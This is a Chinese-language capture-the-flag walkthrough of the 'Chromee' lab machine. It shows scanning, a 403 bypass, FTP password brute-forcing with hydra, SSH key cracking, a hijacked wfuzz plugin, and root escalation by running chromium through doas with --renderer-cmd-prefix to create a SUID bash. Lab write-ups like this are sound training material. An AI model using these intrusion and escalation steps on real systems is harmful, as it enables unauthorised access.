# 一、信息收集

## 1.1 主机发现

首先，在当前网段中使用`arp-scan`工具进行主机发现，寻找目标靶机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.138 08:00:27:9f:e7:fd       PCS Systemtechnik GmbH
...
```

通过扫描，确定目标主机的IP地址为 `192.168.205.138`。

## 1.2 端口扫描

确认目标IP后，使用`nmap`进行全端口扫描，以确定目标开放了哪些服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 16:58 CST
Nmap scan report for 192.168.205.138
Host is up (0.00024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8080/tcp  open  http-proxy
23333/tcp open  elxmgmt
MAC Address: 08:00:27:9F:E7:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示目标开放了四个端口：22 (SSH)、80 (HTTP)、8080 (HTTP-Proxy) 和一个非常规端口 23333。为了识别 23333 端口上运行的具体服务，我们对其进行一次详细的服务版本扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p23333 -sC -sV 192.168.205.138
...
PORT      STATE SERVICE VERSION
23333/tcp open  ftp     vsftpd 3.0.3
...
Service Info: OS: Unix
```

详细扫描确认，23333 端口上运行的是 vsftpd 3.0.3 FTP服务。

# 二、Web服务探测与漏洞利用

## 2.1 FTP服务初步探测

首先尝试对 23333 端口的 FTP 服务进行匿名登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ftp anonymous@192.168.205.138 -p 23333
...
530 Login incorrect.
ftp: Login failed
...
```

匿名登录失败，暂时搁置FTP服务，转向Web服务进行探测。

## 2.2 Web服务信息收集

分别对 80 和 8080 端口的Web服务进行访问和目录扫描。

*   **80端口**：访问后发现是一个静态的展示页面，没有明显的交互功能。
*   **8080端口**：访问后返回提示 `<h2>You may need to bypass!</h2>`。尝试使用 `POST` 请求和添加 `X-Forwarded-For` 头进行绕过，均未成功。

使用 `gobuster` 对两个端口进行目录扫描。

*   **80端口扫描结果**：

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.138 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64 
...
/index.html           (Status: 200) [Size: 4464]
/post.php             (Status: 200) [Size: 3]
/secret.php           (Status: 200) [Size: 549]
...
```

*   **8080端口扫描结果**：

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.138:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
/index.html           (Status: 200) [Size: 33]
/javascript           (Status: 301) [Size: 330] [--> http://192.168.205.138:8080/javascript/]
/silence              (Status: 403) [Size: 282]
...
```

扫描发现 80 端口存在 `/secret.php`，8080 端口存在 `/silence` 目录但访问被禁止 (403 Forbidden)。

## 2.3 漏洞发现与信息泄露

访问 `/secret.php` 并查看其源代码，发现其中包含PHP代码。

```php
...
    $greeting = date('H') < 12 ? '早上好' : (date('H') < 18 ? '下午好' : '晚上好');
    $visitorIP = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    echo "<h1>{$greeting}，adriana</h1>";
    ...
    if (isset($_GET['aaa'])) {
        $file_content = file_get_contents('/opt/note/dic.txt');
        echo $file_content;
        } else {
                die();
        }
...
```

从代码中获得两条关键信息：

1.  可能存在一个用户名为 `adriana`。
2.  存在一个文件读取漏洞，通过提供 `aaa` GET参数可以读取服务器上的 `/opt/note/dic.txt` 文件。

## 2.4 绕过403 Forbidden

针对 8080 端口的 `/silence` 目录，使用[自动化脚本](https://github.com/byt3hx/403-bypass)尝试多种方法绕过 403 限制。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/403-bypass]
└─$ python3 403-bypass.py -u http://192.168.205.138:8080 -p silence/
...
http://192.168.205.138:8080/silence/ : (X-rewrite-url: /silence/) : 200
http://192.168.205.138:8080/silence/ : Using POST: 200
...
```

测试发现，使用 `POST` 方法请求可以成功绕过访问限制。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/403-bypass]
└─$ curl -X POST http://192.168.205.138:8080/silence/
...
      <p>contact: support@chromee.hmv</p>
...
```

成功访问页面，并在页面内容中发现一个域名 `chromee.hmv`。将此域名与目标IP绑定到 `/etc/hosts` 文件中。

## 2.5 获取密码字典并爆破

利用前面发现的文件读取漏洞，访问 `http://chromee.hmv/secret.php?aaa` 来读取 `/opt/note/dic.txt` 的内容。

```html
...
The Lost Key

Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.
...
```

服务器返回了一段小故事。根据渗透测试的常见思路，故事中的名词很可能被用作密码。我们提取这些关键词，并使用 `cupp` 工具生成一个更丰富的密码字典，然后使用 `hydra` 对之前发现的 FTP 用户 `adriana` 进行密码爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat wordlist.txt
Lily
curious
key
woods
village
well
stone
passage
chest
treasures
treasure
journey
prize
adventure
reward
rusty
locked
hidden
ancient
greatest
LostKey
TheLostKey
thelostkey
lostkey

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cupp -w wordlist.txt
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l adriana -P wordlist.txt.cupp.txt ftp://192.168.205.138:23333 -t 64
...
[23333][ftp] host: 192.168.205.138   login: adriana   password: Lily2020
[STATUS] attack finished for 192.168.205.138 (valid pair found)
...
```

成功爆破出 FTP 凭证：`adriana:Lily2020`。

# 三、横向移动与权限提升

## 3.1 登录FTP并发现私钥

使用破解的凭证登录FTP服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ftp adriana@192.168.205.138 -p 23333
Password:
230 Login successful.
...
ftp> ls -la
...
-rw-r--r--    1 0        0            3414 Mar 09  2025 ...
-rw-r--r--    1 0        0             495 Mar 07  2025 dic.txt
...
```

发现一个名为 `...` 的可疑文件。使用 `wget` 将其下载到本地，经过查看`...`是ssh私钥。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ wget -r ftp://adriana:Lily2020@192.168.205.138:23333/
...
```

## 3.2 破解私钥密码

将下载的文件重命名为 `id_rsa` 并设置正确权限，然后使用 `ssh2john` 和 `john` 对私钥的密码进行破解。

```bash
┌──(kali㉿kali)-[/tmp/192.168.205.138:23333]
└─$ mv ... id_rsa
└─$ chmod 600 id_rsa
└─$ ssh2john id_rsa > hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
cassandra        (id_rsa)
...
Session completed.
```

成功破解私钥的密码为 `cassandra`。

## 3.3 登录SSH并枚举

再次登录FTP，通过目录遍历在 `/home` 目录下发现了 `follower` 和 `softly` 两个用户。尝试使用破解的私钥以 `follower` 用户身份登录 SSH。

```bash
┌──(kali㉿kali)-[/tmp/192.168.205.138:23333]
└─$ ssh follower@192.168.205.138 -i id_rsa
Enter passphrase for key 'id_rsa':
follower@Chromee:~$ id
uid=1000(follower) gid=1000(follower) grupos=1000(follower)
```

成功登录。检查 `sudo` 权限失败后，查找具有 SUID 权限的二进制文件，发现了一个非标准的 `doas` 程序。

```bash
follower@Chromee:~$ find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
...
-rwsr-xr-x 1 root root 42352 mar  7  2025 /usr/local/bin/doas
...
```

## 3.4 Doas配置分析与提权至softly

`doas` 是 `sudo` 的一个轻量级替代品。通过在系统中搜索近期修改的文件，最终在 `/srv/zeus.conf` 找到了其配置文件。

```bash
follower@Chromee:/tmp$ cat /srv/zeus.conf
permit follower as softly cmd /usr/local/bin/wfuzz
permit nopass :softly as root cmd /usr/bin/chromium
permit nopass :softly as root cmd /usr/bin/kill
```

配置文件显示，`follower` 用户可以作为 `softly` 用户执行 `/usr/local/bin/wfuzz`。同时，在 `follower` 的家目录下发现 `note.txt`，提示与ROT47相关。通过对 `cat.gif` 文件进行隐写分析，提取其帧延迟时间序列进行ROT47解码，最终得到 `softly` 用户的密码：`p3p573r`。

*ps:https://blog.csdn.net/CHTXRT/article/details/128728967*

![image-20251019180141537](http://7r1UMPHK.github.io/image/20251019194916057.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ identify -format "%s %T n" cat.gif
0 65 n1 98 n2 65 n3 100 n4 102 n5 98 n6 67 n7 6 n8 6 n9 6 n10 6 n11 6 n12 6 n                                                                           
```

延迟时间序列：`65 98 65 100 102 98 67 6 6 6 6 6 6`

https://gchq.github.io/CyberChef

![image-20251019180519820](http://7r1UMPHK.github.io/image/20251019194918340.webp)

```bash
follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz --help
Password: p3p573r
...
# 成功执行
```

我们发现 `wfuzz` 的一个插件文件 `/usr/local/lib/python3.9/dist-packages/wfuzz/plugins/payloads/file.py` 对当前用户可写。经过查看发现`file.py`文件已经被修改成了`pty.spawn("/bin/bash")`，那我们可以通过 `doas` 以 `softly` 用户的身份执行 `wfuzz` 来触发代码，从而获得 `softly` 的shell。

```
ollower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -w /home/softly/.ssh/id_rsa -u 127.0.0.1
Password: 
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
softly@Chromee:/home/follower$ id
uid=1001(softly) gid=1001(softly) groups=1001(softly)
```

为了获得一个稳定的交互式Shell，我们选择写入自己的SSH公钥到 `softly` 用户的 `authorized_keys` 文件中。

```bash
softly@Chromee:~$ mkdir .ssh
softly@Chromee:~$ echo 'ssh-rsa AAAAB...' > ~/.ssh/authorized_keys
```

之后，便可从kali直接免密登录 `softly` 账户。

## 3.5 提权至root

登录 `softly` 账户后，再次分析 `doas` 配置文件，发现 `softly` 用户可以无密码以 `root` 权限执行 `/usr/bin/chromium`。

```
permit nopass :softly as root cmd /usr/bin/chromium
```

Chromium/Chrome 浏览器存在一个已知的提权技巧，即利用 `--renderer-cmd-prefix` 参数在沙箱外以更高权限执行命令。我们创建一个脚本 `/tmp/pwn.sh`，内容为复制 `bash` 并为其添加 SUID 权限位。

```bash
softly@Chromee:/tmp$ cat > /tmp/pwn.sh << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
softly@Chromee:/tmp$ chmod +x /tmp/pwn.sh
```

现在，以 `root` 权限执行 `chromium` 并指定我们的恶意脚本。

```bash
softly@Chromee:/tmp$ doas -u root /usr/bin/chromium --headless --no-sandbox --renderer-cmd-prefix="/tmp/pwn.sh"
...
```

命令执行后，检查 `/tmp` 目录，发现已成功创建了一个带有 SUID 权限的 `rootbash`。

```bash
softly@Chromee:/tmp$ ls -la /tmp/rootbash
-rwsr-xr-x  1 root     root     1234376 oct 19 13:23 /tmp/rootbash
```

执行此文件，即可获得 `root` 权限。

```bash
softly@Chromee:/tmp$ ./rootbash -p
rootbash-5.1# id
uid=1001(softly) gid=1001(softly) euid=0(root) grupos=1001(softly)
```

## 3.6 获取Flag

成功提权至 `root`，现在可以读取所有flag文件。

```bash
rootbash-5.1# cat /home/softly/user.txt
flag{c5dbe81aac6438c522d2f79cc7255e6a}

rootbash-5.1# cat /root/root.txt
flag{e96f7a29ba633b4e43214b43d1791074}
```

至此，渗透测试完成。